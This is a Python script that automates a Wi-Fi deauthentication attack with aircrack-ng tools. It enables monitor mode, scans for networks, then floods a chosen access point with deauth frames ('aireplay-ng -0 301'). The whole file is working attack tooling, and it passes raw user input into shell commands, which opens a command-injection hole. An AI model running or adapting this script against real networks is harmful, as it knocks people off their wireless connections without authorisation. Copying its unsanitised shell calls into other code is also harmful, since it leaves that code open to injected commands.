import os
import time
from threading import Thread

os.system("sudo iwconfig")
interface = input("Enter the wifi interface: ")
os.system(f"sudo airmon-ng start {interface}")
interfaces = input("Enter the wifi interface from iwconfig showed: ")
print("Start Monitoring WiFi Network...!")
def airedump_start():
    count = 0
    while count < 1:
        time.sleep(0.5)
        os.system(f"sudo airodump-ng {interfaces}")
        count+=1
start = Thread(target=airedump_start)
start.daemon = True
start.start()
start.join()
print ("1. Monitoring Specific BSSID\n2. Deauth")
x = int(input("Enter the option: "))
if x == 1:
    a = input("Enter the BSSID: ")
    b = input("Enter the channel number: ")

    def airodump():
        count = 0
        while count < 1:
            time.sleep(0.5)
            os.system(f"sudo airodump-ng {interfaces} --bssid {a} --channel {b}")
            count+=1

    aero = Thread(target=airodump)
    aero.daemon = True
    aero.start()
    aero.join()

    print("1. Deauth\n2. Quit")
    y = int(input("Enter the option: "))
    if y == 1:
        def aireplay():
            count = 0
            while count < 1:
                time.sleep(0.5)
                os.system(f"sudo aireplay-ng -0 301 -a {a} {interfaces}")
                count+=1

        airplay = Thread(target=aireplay)
        airplay.daemon = True
        airplay.start()
        airplay.join()

    else:
        print("Stop Airmon-ng...!")
        os.system(f"sudo airmon-ng stop {interfaces}")
        print("Stoped...!")

else:
    a = input("Enter the BSSID: ")
    def aireplays():
        count = 0
        while count < 1:
            time.sleep(0.5)
            os.system(f"sudo aireplay-ng -0 301 -a {a} {interfaces}")
            count+=1

    airplays = Thread(target=aireplays)
    airplays.daemon = True
    airplays.start()
    airplays.join()
print("Deauth Attack completed...!")
print("Stop Airmon-ng...!")
os.system(f"sudo airmon-ng stop {interfaces}")
print("Stoped...!")
